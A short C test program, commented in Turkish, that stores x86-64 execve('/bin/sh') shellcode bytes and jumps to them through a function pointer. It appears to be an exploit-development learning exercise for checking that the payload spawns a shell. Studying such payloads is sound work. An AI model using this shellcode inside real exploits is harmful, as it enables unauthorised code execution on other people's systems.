/*
 * calistirici.c
 * Amaç: execve("/bin/sh") shellcode'unu test etmek.
 */

#include <stdio.h>
#include <string.h>

/*
 * Shellcode (execve("/bin/sh"))
 * Bu, spawn_shell.nasm dosyasının derlenmesiyle elde edilen
 * makine kodudur. Kendi derlemenizden çıkan kod farklı olabilir!
 * objdump -d ./spawn_shell komutuyla kendi kodunuzu alabilirsiniz.
 *
 * \xeb\x1f... : jmp short ...
 * ...
 */
unsigned char shellcode[] = "\xeb\x1f\x5f\x88\x47\x07\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";


int main() {
    printf("Shellcode test programi baslatildi.\n");
    printf("Komut satiri baslatacak shellcode calistirilacak...\n");
    printf("Shellcode boyutu: %zu byte\n", sizeof(shellcode) - 1);

    /*
     * Shellcode'u çalıştırmak için bir fonksiyon göstericisine atama yapıyoruz
     * ve bu adrese atlıyoruz.
     */
    void (*calistir_shellcode)() = (void(*)())shellcode;
    calistir_shellcode();

    /*
     * Eğer shellcode doğru çalışırsa, bu programın kontrolü
     * /bin/sh programına geçeceği için bu satır asla çalışmaz.
     */
    printf("HATA: Bu mesajin gorunmemesi gerekirdi.\n");

    return 1;
}
